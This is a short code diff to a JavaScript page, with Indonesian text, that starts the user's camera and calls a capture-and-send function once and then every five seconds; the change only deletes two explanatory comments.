@@ -13,10 +13,8 @@ startBtn.addEventListener('click', async () => {
       video.srcObject = stream;
       errorMsg.style.display = 'none';
 
-      // Ambil screenshot pertama langsung setelah kamera aktif
       captureAndSend();
 
-      // Kemudian ambil screenshot setiap 5 detik
       intervalId = setInterval(captureAndSend, 5000);
     } catch (err) {
       errorMsg.textContent = 'Akses kamera ditolak! Harap izinkan agar sistem dapat berjalan.';
